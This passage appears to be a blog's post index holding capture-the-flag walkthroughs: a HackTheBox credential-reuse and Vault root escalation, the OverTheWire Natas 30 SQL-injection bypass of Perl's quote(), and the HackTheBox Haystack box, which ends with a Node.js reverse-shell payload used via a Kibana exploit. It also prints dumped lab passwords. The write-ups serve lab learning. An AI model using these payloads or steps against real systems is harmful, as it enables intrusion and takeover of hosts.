0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;VIEW_TABLE_USAGE&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}] There are actually only two application-related tables, “brew” and “user”. I think it’s pretty obvious which one we want to dump data from. Just modify the python script again to get the data you want.The dumped user data should look like this:[{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}, {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}, {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}]More credentials! That’s exactly what we need to get further into this box. Try your newly found credentials on everything to see if these guys re-use passwords.You should find out that Gilfoyle does!Back To The SourceOnce you log into the Gogs service with Gilfoyle’s credentials, you’ll see he has a private repository that you can now explore.You should immediately see that there’s a folder “.ssh” and inside it actually has an SSH private key. That’s got to be used for something good.Also, there’s a suspicious-looking file named “secrets.sh” in the “vault” folder. Anything named secrets is sure to be a juicy target, right? Inside of the shell script it even mentions the “root” user. Definitely research this file and see what’s it’s about.VaultFrom the documentation: Vault is a tool for securely accessing secrets. As far as targets go, nothing could be juicier than things intentionally hidden. So you have to figure out how to use the vault.Googling the line of code “vault secrets enable ssh” from the “secrets.sh” script, you’ll come to a documentation page explaining ways to use SSH authentication with Vault. After reading the manual, you should be able to tell that this script is setting up a One Time SSH Password to log into the root account. So running this script is probably a way to escalate to the root account after we get in some other way first.SSHUse this key to log into one of the SSH services that was discovered early in the challenge. Copy the keys into your own “.ssh” folder. I named mine specifically for this challenge, but you can leave the default names as they are.After you have the keys saved to your box, make sure the agent is running by issuing the command ssh-agent and then add the key with ssh-add like this:You will be prompted for a passphrase to use the private key, but good for us that Gilfoyle reuses passwords! Just copy and paste in the previously found password and you’re in!Get USER, onto ROOTGetting root is super easy since we already saw the way in. From the vault documentation, just issue the following command that will do the same thing that script file does:vault ssh -role root_otp -mode otp root@10.10.10.110And then you’ll be able to use the One Time Password for access to root on the vault.Once you copy and paste the code in for the password, you’ll be greeted with a root prompt.That’s it!" }, { "title": "OverTheWire: NATAS 30", "url": "/posts/overthewire-natas-30/", "categories": "Walkthrough, OverTheWire", "tags": "web, perl, sqli", "date": "2019-10-04 15:24:53 -0400", "snippet": "This is another basic login form. The unique thing about this one is the sourcecode is in PERL.#!/usr/bin/perluse CGI qw(:standard);use DBI;print &amp;lt;&amp;lt;END;Content-Type: text/html; charset=iso-8859-1&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;!-- This stuff in the header has nothing to do with the level --&amp;gt;&amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&amp;gt;&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&amp;gt;&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&amp;gt;&amp;lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;var wechallinfo = { &quot;level&quot;: &quot;natas30&quot;, &quot;pass&quot;: &quot;&amp;lt;censored&amp;gt;&quot; };&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body oncontextmenu=&quot;javascript:alert(&#39;right clicking has been blocked!&#39;);return false;&quot;&amp;gt;&amp;lt;!-- morla/10111 &amp;lt;3 happy birthday OverTheWire! &amp;lt;3 --&amp;gt;&amp;lt;h1&amp;gt;natas30&amp;lt;/h1&amp;gt;&amp;lt;div id=&quot;content&quot;&amp;gt;&amp;lt;form action=&quot;index.pl&quot; method=&quot;POST&quot;&amp;gt;Username: &amp;lt;input name=&quot;username&quot;&amp;gt;&amp;lt;br&amp;gt;Password: &amp;lt;input name=&quot;password&quot; type=&quot;password&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;login&quot; /&amp;gt;&amp;lt;/form&amp;gt;ENDif (&#39;POST&#39; eq request_method &amp;amp;&amp;amp; param(&#39;username&#39;) &amp;amp;&amp;amp; param(&#39;password&#39;)){ my $dbh = DBI-&amp;gt;connect( &quot;DBI:mysql:natas30&quot;,&quot;natas30&quot;, &quot;&amp;lt;censored&amp;gt;&quot;, {&#39;RaiseError&#39; =&amp;gt; 1}); my $query=&quot;Select * FROM users where username =&quot;.$dbh-&amp;gt;quote(param(&#39;username&#39;)) . &quot; and password =&quot;.$dbh-&amp;gt;quote(param(&#39;password&#39;)); my $sth = $dbh-&amp;gt;prepare($query); $sth-&amp;gt;execute(); my $ver = $sth-&amp;gt;fetch(); if ($ver){ print &quot;win!&amp;lt;br&amp;gt;&quot;; print &quot;here is your result:&amp;lt;br&amp;gt;&quot;; print @$ver; } else{ print &quot;fail :(&quot;; } $sth-&amp;gt;finish(); $dbh-&amp;gt;disconnect();}print &amp;lt;&amp;lt;END;&amp;lt;div id=&quot;viewsource&quot;&amp;gt;&amp;lt;a href=&quot;index-source.html&quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;ENDFrom quick examination of the source, it’s clear that we’re intended to do SQL injection here. In fact, we don’t even have to extract the password, it should be given to us if we are able to get ANY successful result from the query. So a very simple SQL injection will do. Problem is, and the central challenge here, is the quote() function that’s supposed to be sanitizing our inputs. There must be a known way around quote().A few minutes of searching Google and I found the answer I was looking for. Turns out param() from CGI.pm introduces a vulnerability to quote(). From the post: You see, param is context-sensitive. In scalar context, if the parameter has a single value (name=foo), it returns that value, and if the parameter has multiple values (name=foo&amp;amp;name=bar) it returns an arrayref. In list context, it returns a list of values, whether there are zero, one, or many. The argument list of a method (such as quote) is a list context. That means that someone using your app can cause quote to receive two values, and quote‘s optional second argument is an SQL data type that the first argument should be treated as. If the data type is a non-string type like NUMERIC, then quote will pass its first argument through without any quoting. This constitutes an opportunity for SQL injection.To exploit the vuln, simply send username=natas31&amp;amp;password=”or 1=1&amp;amp;password=2 in the POST data." }, { "title": "HackTheBox: Haystack", "url": "/posts/hackthebox-haystack/", "categories": "Walkthrough, HackTheBox", "tags": "Linux, web, elasticsearch, logstash, Kibana, stegonography", "date": "2019-10-01 10:21:58 -0400", "snippet": "ScansStarting Nmap 7.80 ( &amp;lt;https://nmap.org&amp;gt; ) at 2019-10-01 09:16 EDT Nmap scan report for 10.10.10.115 Host is up, received user-set (0.24s latency).PORT STATE SERVICE REASON VERSION **22/tcp** open ssh syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) **80/tcp** open http syn-ack ttl 63 nginx 1.12.2 |_http-server-header: nginx/1.12.2 |_http-title: Site doesn&amp;amp;#8217;t have a title (text/html). **9200/tcp** open http syn-ack ttl 63 nginx 1.12.2 | http-methods: |_ Potentially risky methods: **DELETE** |_http-server-header: nginx/1.12.2 |_http-title: Site doesn&amp;amp;#8217;t have a title (application/json; charset=UTF-8). Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 &amp;amp;#8211; 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 &amp;amp;#8211; 4.6 (91%), Linux 3.2 &amp;amp;#8211; 4.9 (91%), Linux 3.8 &amp;amp;#8211; 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 3.16 (90%)NMAP shows an SSH server, and two HTTP servers. The interesting thing is the HTTP server on port 9200 has the DELETE method available. Website InvestigationsThe site on regular HTTP port 80 is very bare, only giving us a picture and nothing else: The site on HTTP 9200 has more going on. It is an elasticsearch service version 6.4.2:So the picture is a clue that we’ll be looking up something in the search database. Hence the picture of a “needle”, which is what a search query is sometimes called.It’s possible this version of elasticsearch has an exploit out there. There is one I found but it is about the “console” plugin and it doesn’t appear to work here… CVE-2018-17246. REST APII didn’t know anything about elasticsearch before this box, so I’ll write out things as I learn them and hope it all goes well. The port 9200 is used for elasticsearch’s REST API, so we’ll need to learn how to use it from elasticsearch’s documentation.When trying to use a typical query POST request, I get an error stating that the server doesn’t support POST.root@kali /root ⚡ curl -XPOST &quot;http://10.10.10.115:9200&quot; -d&#39;{ &quot;query&quot;:{ &quot;match_all&quot;:{} }}&#39;{&quot;error&quot;:&quot;Incorrect HTTP method for uri [/] and method [POST], allowed: [HEAD, DELETE, GET]&quot;,&quot;status&quot;:405}#And that’s because I wasn’t using it correctly, since I didn’t know what I was doing.Here’s a request that returns something.root@kali /root ⚡ curl -XPOST &quot;http://10.10.10.115:9200/_search/&quot; {&quot;took&quot;:3,&quot;timed_out&quot;:false,&quot;_shards&quot;:{&quot;total&quot;:11,&quot;successful&quot;:11,&quot;skipped&quot;:0,&quot;failed&quot;:0},&quot;hits&quot;:{&quot;total&quot;:1254,&quot;max_score&quot;:1.0,&quot;hits&quot;:[{&quot;_index&quot;:&quot;.kibana&quot;,&quot;_type&quot;:&quot;doc&quot;,&quot;_id&quot;:&quot;config:6.4.2&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;type&quot;:&quot;config&quot;,&quot;updated_at&quot;:&quot;2019-01-23T18:15:53.396Z&quot;,&quot;config&quot;:{&quot;buildNum&quot;:18010,&quot;telemetry:optIn&quot;:false}}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;25&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:25,&quot;balance&quot;:40540,&quot;firstname&quot;:&quot;Virginia&quot;,&quot;lastname&quot;:&quot;Ayala&quot;,&quot;age&quot;:39,&quot;gender&quot;:&quot;F&quot;,&quot;address&quot;:&quot;171 Putnam Avenue&quot;,&quot;employer&quot;:&quot;Filodyne&quot;,&quot;email&quot;:&quot;virginiaayala@filodyne.com&quot;,&quot;city&quot;:&quot;Nicholson&quot;,&quot;state&quot;:&quot;PA&quot;}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;44&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:44,&quot;balance&quot;:34487,&quot;firstname&quot;:&quot;Aurelia&quot;,&quot;lastname&quot;:&quot;Harding&quot;,&quot;age&quot;:37,&quot;gender&quot;:&quot;M&quot;,&quot;address&quot;:&quot;502 Baycliff Terrace&quot;,&quot;employer&quot;:&quot;Orbalix&quot;,&quot;email&quot;:&quot;aureliaharding@orbalix.com&quot;,&quot;city&quot;:&quot;Yardville&quot;,&quot;state&quot;:&quot;DE&quot;}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;99&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:99,&quot;balance&quot;:47159,&quot;firstname&quot;:&quot;Ratliff&quot;,&quot;lastname&quot;:&quot;Heath&quot;,&quot;age&quot;:39,&quot;gender&quot;:&quot;F&quot;,&quot;address&quot;:&quot;806 Rockwell Place&quot;,&quot;employer&quot;:&quot;Zappix&quot;,&quot;email&quot;:&quot;ratliffheath@zappix.com&quot;,&quot;city&quot;:&quot;Shaft&quot;,&quot;state&quot;:&quot;ND&quot;}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;119&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:119,&quot;balance&quot;:49222,&quot;firstname&quot;:&quot;Laverne&quot;,&quot;lastname&quot;:&quot;Johnson&quot;,&quot;age&quot;:28,&quot;gender&quot;:&quot;F&quot;,&quot;address&quot;:&quot;302 Howard Place&quot;,&quot;employer&quot;:&quot;Senmei&quot;,&quot;email&quot;:&quot;lavernejohnson@senmei.com&quot;,&quot;city&quot;:&quot;Herlong&quot;,&quot;state&quot;:&quot;DC&quot;}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;126&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:126,&quot;balance&quot;:3607,&quot;firstname&quot;:&quot;Effie&quot;,&quot;lastname&quot;:&quot;Gates&quot;,&quot;age&quot;:39,&quot;gender&quot;:&quot;F&quot;,&quot;address&quot;:&quot;620 National Drive&quot;,&quot;employer&quot;:&quot;Digitalus&quot;,&quot;email&quot;:&quot;effiegates@digitalus.com&quot;,&quot;city&quot;:&quot;Blodgett&quot;,&quot;state&quot;:&quot;MD&quot;}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;145&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:145,&quot;balance&quot;:47406,&quot;firstname&quot;:&quot;Rowena&quot;,&quot;lastname&quot;:&quot;Wilkinson&quot;,&quot;age&quot;:32,&quot;gender&quot;:&quot;M&quot;,&quot;address&quot;:&quot;891 Elton Street&quot;,&quot;employer&quot;:&quot;Asimiline&quot;,&quot;email&quot;:&quot;rowenawilkinson@asimiline.com&quot;,&quot;city&quot;:&quot;Ripley&quot;,&quot;state&quot;:&quot;NH&quot;}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;183&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:183,&quot;balance&quot;:14223,&quot;firstname&quot;:&quot;Hudson&quot;,&quot;lastname&quot;:&quot;English&quot;,&quot;age&quot;:26,&quot;gender&quot;:&quot;F&quot;,&quot;address&quot;:&quot;823 Herkimer Place&quot;,&quot;employer&quot;:&quot;Xinware&quot;,&quot;email&quot;:&quot;hudsonenglish@xinware.com&quot;,&quot;city&quot;:&quot;Robbins&quot;,&quot;state&quot;:&quot;ND&quot;}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;190&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:190,&quot;balance&quot;:3150,&quot;firstname&quot;:&quot;Blake&quot;,&quot;lastname&quot;:&quot;Davidson&quot;,&quot;age&quot;:30,&quot;gender&quot;:&quot;F&quot;,&quot;address&quot;:&quot;636 Diamond Street&quot;,&quot;employer&quot;:&quot;Quantasis&quot;,&quot;email&quot;:&quot;blakedavidson@quantasis.com&quot;,&quot;city&quot;:&quot;Crumpler&quot;,&quot;state&quot;:&quot;KY&quot;}},{&quot;_index&quot;:&quot;bank&quot;,&quot;_type&quot;:&quot;account&quot;,&quot;_id&quot;:&quot;208&quot;,&quot;_score&quot;:1.0,&quot;_source&quot;:{&quot;account_number&quot;:208,&quot;balance&quot;:40760,&quot;firstname&quot;:&quot;Garcia&quot;,&quot;lastname&quot;:&quot;Hess&quot;,&quot;age&quot;:26,&quot;gender&quot;:&quot;F&quot;,&quot;address&quot;:&quot;810 Nostrand Avenue&quot;,&quot;employer&quot;:&quot;Quiltigen&quot;,&quot;email&quot;:&quot;garciahess@quiltigen.com&quot;,&quot;city&quot;:&quot;Brooktrails&quot;,&quot;state&quot;:&quot;GA&quot;}}]}}And here is the formatted JSON:{ &quot;took&quot;: 3, &quot;timed_out&quot;: false, &quot;_shards&quot;: { &quot;total&quot;: 11, &quot;successful&quot;: 11, &quot;skipped&quot;: 0, &quot;failed&quot;: 0 }, &quot;hits&quot;: { &quot;total&quot;: 1254, &quot;max_score&quot;: 1.0, &quot;hits&quot;: [ { &quot;_index&quot;: &quot;.kibana&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;config:6.4.2&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;type&quot;: &quot;config&quot;, &quot;updated_at&quot;: &quot;2019-01-23T18:15:53.396Z&quot;, &quot;config&quot;: { &quot;buildNum&quot;: 18010, &quot;telemetry:optIn&quot;: false } } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;25&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 25, &quot;balance&quot;: 40540, &quot;firstname&quot;: &quot;Virginia&quot;, &quot;lastname&quot;: &quot;Ayala&quot;, &quot;age&quot;: 39, &quot;gender&quot;: &quot;F&quot;, &quot;address&quot;: &quot;171 Putnam Avenue&quot;, &quot;employer&quot;: &quot;Filodyne&quot;, &quot;email&quot;: &quot;virginiaayala@filodyne.com&quot;, &quot;city&quot;: &quot;Nicholson&quot;, &quot;state&quot;: &quot;PA&quot; } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;44&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 44, &quot;balance&quot;: 34487, &quot;firstname&quot;: &quot;Aurelia&quot;, &quot;lastname&quot;: &quot;Harding&quot;, &quot;age&quot;: 37, &quot;gender&quot;: &quot;M&quot;, &quot;address&quot;: &quot;502 Baycliff Terrace&quot;, &quot;employer&quot;: &quot;Orbalix&quot;, &quot;email&quot;: &quot;aureliaharding@orbalix.com&quot;, &quot;city&quot;: &quot;Yardville&quot;, &quot;state&quot;: &quot;DE&quot; } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;99&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 99, &quot;balance&quot;: 47159, &quot;firstname&quot;: &quot;Ratliff&quot;, &quot;lastname&quot;: &quot;Heath&quot;, &quot;age&quot;: 39, &quot;gender&quot;: &quot;F&quot;, &quot;address&quot;: &quot;806 Rockwell Place&quot;, &quot;employer&quot;: &quot;Zappix&quot;, &quot;email&quot;: &quot;ratliffheath@zappix.com&quot;, &quot;city&quot;: &quot;Shaft&quot;, &quot;state&quot;: &quot;ND&quot; } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;119&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 119, &quot;balance&quot;: 49222, &quot;firstname&quot;: &quot;Laverne&quot;, &quot;lastname&quot;: &quot;Johnson&quot;, &quot;age&quot;: 28, &quot;gender&quot;: &quot;F&quot;, &quot;address&quot;: &quot;302 Howard Place&quot;, &quot;employer&quot;: &quot;Senmei&quot;, &quot;email&quot;: &quot;lavernejohnson@senmei.com&quot;, &quot;city&quot;: &quot;Herlong&quot;, &quot;state&quot;: &quot;DC&quot; } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;126&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 126, &quot;balance&quot;: 3607, &quot;firstname&quot;: &quot;Effie&quot;, &quot;lastname&quot;: &quot;Gates&quot;, &quot;age&quot;: 39, &quot;gender&quot;: &quot;F&quot;, &quot;address&quot;: &quot;620 National Drive&quot;, &quot;employer&quot;: &quot;Digitalus&quot;, &quot;email&quot;: &quot;effiegates@digitalus.com&quot;, &quot;city&quot;: &quot;Blodgett&quot;, &quot;state&quot;: &quot;MD&quot; } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;145&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 145, &quot;balance&quot;: 47406, &quot;firstname&quot;: &quot;Rowena&quot;, &quot;lastname&quot;: &quot;Wilkinson&quot;, &quot;age&quot;: 32, &quot;gender&quot;: &quot;M&quot;, &quot;address&quot;: &quot;891 Elton Street&quot;, &quot;employer&quot;: &quot;Asimiline&quot;, &quot;email&quot;: &quot;rowenawilkinson@asimiline.com&quot;, &quot;city&quot;: &quot;Ripley&quot;, &quot;state&quot;: &quot;NH&quot; } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;183&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 183, &quot;balance&quot;: 14223, &quot;firstname&quot;: &quot;Hudson&quot;, &quot;lastname&quot;: &quot;English&quot;, &quot;age&quot;: 26, &quot;gender&quot;: &quot;F&quot;, &quot;address&quot;: &quot;823 Herkimer Place&quot;, &quot;employer&quot;: &quot;Xinware&quot;, &quot;email&quot;: &quot;hudsonenglish@xinware.com&quot;, &quot;city&quot;: &quot;Robbins&quot;, &quot;state&quot;: &quot;ND&quot; } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;190&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 190, &quot;balance&quot;: 3150, &quot;firstname&quot;: &quot;Blake&quot;, &quot;lastname&quot;: &quot;Davidson&quot;, &quot;age&quot;: 30, &quot;gender&quot;: &quot;F&quot;, &quot;address&quot;: &quot;636 Diamond Street&quot;, &quot;employer&quot;: &quot;Quantasis&quot;, &quot;email&quot;: &quot;blakedavidson@quantasis.com&quot;, &quot;city&quot;: &quot;Crumpler&quot;, &quot;state&quot;: &quot;KY&quot; } }, { &quot;_index&quot;: &quot;bank&quot;, &quot;_type&quot;: &quot;account&quot;, &quot;_id&quot;: &quot;208&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 208, &quot;balance&quot;: 40760, &quot;firstname&quot;: &quot;Garcia&quot;, &quot;lastname&quot;: &quot;Hess&quot;, &quot;age&quot;: 26, &quot;gender&quot;: &quot;F&quot;, &quot;address&quot;: &quot;810 Nostrand Avenue&quot;, &quot;employer&quot;: &quot;Quiltigen&quot;, &quot;email&quot;: &quot;garciahess@quiltigen.com&quot;, &quot;city&quot;: &quot;Brooktrails&quot;, &quot;state&quot;: &quot;GA&quot; } } ] }}Using curl -XGET &quot;10.10.10.115:9200/bank/&quot; will show the format of the “bank” index. And we can do the same for “.kibana”, which might be a little more interesting. But honestly, I didn’t see anything in either which was really useful unless you’re a spammer just collecting email addresses. If we knew what ALL the indexes are, then maybe we could find something better.Use curl -XGET &quot;10.10.10.115:9200/_cat/indices?v&quot; to find out what the indexes are:root@kali /root/htb/haystack ⚡ curl -XGET &quot;10.10.10.115:9200/_cat/indices?v&quot;health status index uuid pri rep docs.count docs.deleted store.size pri.store.sizegreen open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0 1 0 4kb 4kbyellow open quotes ZG2D1IqkQNiNZmi2HRImnQ 5 1 253 0 262.7kb 262.7kbyellow open bank eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kbAnd you can get the structure of them all by using curl -XGET &quot;10.10.10.115:9200/*/&quot; .After playing with submitting queries, my favorite way to submit them is on the URI like… curl -XGET &quot;10.10.10.115:9200/bank/_search/?pretty=true&amp;amp;q=web*&quot; … where the “q=” is the search string.While searching around in the data, I found this bit of encouragement to know I’m on the right track:root@kali /root/htb/haystack ⚡ curl -XGET &quot;10.10.10.115:9200/quotes/quote/2/_source?pretty=true&quot;{ &quot;quote&quot; : &quot;There&#39;s a needle in this haystack, you have to search for it&quot;}After a while of trying different searches like curl -XGET “10.10.10.115:9200/_search?pretty=true&amp;amp;q=needle” and getting nowhere fast, I decided to reassess where I was at in the challenge. Normally when I’m stuck that’s because I’m overlooking something that I should have paid closer attention to. Along with the help of a hint from a forum post that said the picture wasn’t actually useless, I was able to find another clue.I downloaded the image of the needle from the port 80 website, and ran a “file” check on it to see if anything odd stood out.root@kali /root/Downloads ⚡ file needle.jpg needle.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=paint.net 4.1.1], baseline, precision 8, 1200x803, components 3 Nothing out of the ordinary there, so then I printed out the data with “cat”, hoping there might be a hidden string in the padding at the end of the file. That’s a pretty common stegonography trick with JPEG files. Sure enough there was! It was a base64 encoded string. So I extracted it and decoded it:root@kali /root/Downloads ⚡ cat needle.jpg | tail -c 45 | base64 -dla aguja en el pajar es &quot;clave&quot; Google Translate tells me this is Spanish for:the needle in the haystack is &quot;key&quot;Great! We can query elasticsearch for that and hopefully get somewhere…My first query was for “key”, but that only returned a couple bank accounts that weren’t helpful. So then I searched for “clave” and got two hits that looked good:“Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=” which has a base64 string that decodes to “pass: spanish.is.key”.And “Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg ” which has another base64 string that decodes to “user: security”.Bingo! This should be the login to the SSH server. SSHGetting into the SSH with our found credentials gives access to the user flagLooking at the process list shows that there are some processes running under the users “kibana” and “elasticsearch”. There was an exploit found early in the recon phase that affects kibana for our version on this box, it just wasn’t usable for the first stage.Earlier when we tried to attack kibana it said we were barking up the wrong tree…[security@haystack ~]$ curl &quot;localhost:9200/api/console/api_server?&quot;{&quot;error&quot;:{&quot;root_cause&quot;:[{&quot;type&quot;:&quot;index_not_found_exception&quot;,&quot;reason&quot;:&quot;no such index&quot;,&quot;resource.type&quot;:&quot;index_expression&quot;,&quot;resource.id&quot;:&quot;api&quot;,&quot;index_uuid&quot;:&quot;_na_&quot;,&quot;index&quot;:&quot;api&quot;}],&quot;type&quot;:&quot;index_not_found_exception&quot;,&quot;reason&quot;:&quot;no such index&quot;,&quot;resource.type&quot;:&quot;index_expression&quot;,&quot;resource.id&quot;:&quot;api&quot;,&quot;index_uuid&quot;:&quot;_na_&quot;,&quot;index&quot;:&quot;api&quot;},&quot;status&quot;:404}[security@haystack ~]$ …but if the same query is used against the local interface for kibana, we get a different kind of result:[security@haystack ~]$ curl &quot;localhost:5601/api/console/api_server?&quot;{&quot;statusCode&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:&quot;\\&quot;apis\\&quot; is a required param.&quot;}[security@haystack ~]$…suggesting we may be able to use the exploit afterall.At first I tried to run the exploit code from within the ssh session, but got no results. Then I looked at the forum for just a page or two and there were several hints that seemed to suggest setting up an SSH tunnel to access the 5601 port remotely. So I read up on some tutorials for SSH Tunneling since it is kinda confusing. I got the tunnel built with ssh -L 5601:localhost:5601 security@10.10.10.115 and proved the connection worked by sending one of the previous commands from my box:root@kali /root/Downloads ⚡ curl -XGET &quot;localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;amp;apis=&quot;{&quot;statusCode&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:&quot;\\&quot;apis\\&quot; is a required param.&quot;}At that point we can even open the Kibana app in the browser.But what we really want is to run the exploit and get a reverse shell.The above screenshot shows a tunnel connection where I created the payload file “shellb.js”, and it shows the exploit command being sent to my tunneled port, and finally it shows the reverse connected shell on the left =).The kibana payload file:(function(){ var net = require(&quot;net&quot;), cp = require(&quot;child_process&quot;), sh = cp.spawn(&quot;/bin/sh&quot;, []); var client = new net.Socket(); client.connect(1337, &quot;10.10.14.142&quot;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing})();One caveat about the exploit though, if the reverse shell breaks, you may need to rename the payload file before sending the exploit 